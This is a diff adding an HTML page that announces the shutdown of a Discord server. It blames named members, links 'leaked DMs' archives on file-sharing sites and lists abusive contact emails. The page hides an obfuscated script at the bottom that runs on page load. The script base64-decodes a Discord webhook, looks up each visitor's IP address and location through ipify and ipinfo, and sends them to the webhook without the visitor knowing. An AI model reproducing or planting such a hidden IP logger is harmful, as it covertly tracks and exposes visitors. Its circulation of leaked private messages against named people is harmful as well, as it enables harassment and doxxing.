@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kaomojicord Termination</title>
+    <link rel="stylesheet" href="https://kaomojicord.github.io/index.css">
+    <style>
+        body {
+            background-color: #000;
+            color: #fff;
+            font-family: 'Courier New', Courier, monospace;
+            text-align: center;
+        }
+        .container {
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 20px;
+            background: #111;
+            border-radius: 8px;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+        }
+        h1 {
+            color: #ff0000;
+        }
+        a {
+            color: #00ff00;
+        }
+        video {
+            width: 100%;
+            border: 1px solid #444;
+        }
+        .evidence {
+            margin: 20px 0;
+        }
+        .footer {
+            margin-top: 30px;
+            font-style: italic;
+            color: #888;
+            text-shadow: 0 0 10px #ff0000;
+        }
+        .footer p {
+            margin: 0;
+            padding: 10px 0;
+        }
+        .quote {
+            font-size: 1.2em;
+            color: #ff5555;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Important Announcement</h1>
+        <p>The Kaomojicord server has been terminated. Despite numerous warnings, Racoxx and Dokyun ignored the consequences, leading to this outcome. The end of the server is a direct result of their actions and refusal to listen.</p>
+        <p>Leave this server and add user <strong>Lavisure</strong>. More information and evidence can be found below:</p>
+        <div class="evidence">
+            <p>Video Exposé:</p>
+            <video controls>
+                <source src="https://files.catbox.moe/zknaw2.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </div>
+        <div class="evidence">
+            <p>Leaked DMs:</p>
+            <ul>
+                <li><a href="https://anonymfile.com/QakWN/vault-17.zip">Vault-17.zip (Anonymfile)</a></li>
+                <li><a href="https://filebin.net/muo0ybn68qfemw81/Vault-17.zip">Vault-17.zip (Filebin)</a></li>
+                <li><a href="https://www.mediafire.com/file/kjifv9kaz68x64f/Vault-17.zip/file">Vault-17.zip (Mediafire)</a></li>
+            </ul>
+        </div>
+        <p>For more information, contact:</p>
+        <ul>
+            <li>Email: <a href="mailto:kobayashiii@horsefucker.org">kobayashiii@horsefucker.org</a></li>
+            <li>Email: <a href="mailto:Eclipse.Security@incel.mail">Eclipse.Security@incel.mail</a></li>
+            <li>Email: <a href="mailto:Eclipse.Security.xyz@proton.me">Eclipse.Security.xyz@proton.me</a></li>
+            <li>Discord: @Lavisure</li>
+        </ul>
+        <div class="footer">
+            <p class="quote">"Superbia et vanitas ruina est" - Pride and vanity lead to ruin.</p>
+            <p>They ignored the warnings, sowing the seeds of their downfall. The consequences are clear: the server is gone, and with it, the community they sought to control.</p>
+        </div>
+        <p>Join the new server: <a href="https://dc.gg/kaomojicord">https://dc.gg/kaomojicord</a>. Neco and Kobayashi now run the show, remaking the server in their image.</p>
+    </div>
+
+    <script>
+    (function(){
+        var w = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIyMDY2OTA2OTk1NTQzMjUyOC9RdnF0VGRwS0FVUUEwTkM5bGx5VEtSVDdJR0wwd2NNNUZ6VWp5VXlqTWstZVdoVG5uaTV0cU85T2FxZ2RtWGRTVFJfMA==";
+        var x = "aHR0cHM6Ly9hcGkuaXBpZnkub3Jn";
+        var y = "aHR0cDovL2lwaW5mby5pbw==";
+        function z(d){
+            var r = new XMLHttpRequest();
+            r.open("POST", atob(w), true);
+            r.setRequestHeader('Content-Type', 'application/json');
+            r.send(JSON.stringify({"content": d}));
+        }
+        function a(i){
+            var r = new XMLHttpRequest();
+            r.open("GET", atob(y) + "/" + i + "/json", true);
+            r.onreadystatechange = function(){
+                if(r.readyState == 4 && r.status == 200){
+                    var j = JSON.parse(r.responseText);
+                    var m = "📡 **New Connection Detected!**\n\n" +
+                            "🌐 **IP Information**\n" +
+                            "IP: " + i + "\n" +
+                            "City: " + j.city + "\n" +
+                            "Region: " + j.region + "\n" +
+                            "Country: " + j.country;
+                    z(m);
+                }
+            };
+            r.send();
+        }
+        var r = new XMLHttpRequest();
+        r.open("GET", atob(x), true);
+        r.onreadystatechange = function(){
+            if(r.readyState == 4 && r.status == 200){
+                a(r.responseText);
+            }
+        };
+        r.send();
+    })();
+    </script>
+</body>
+</html>
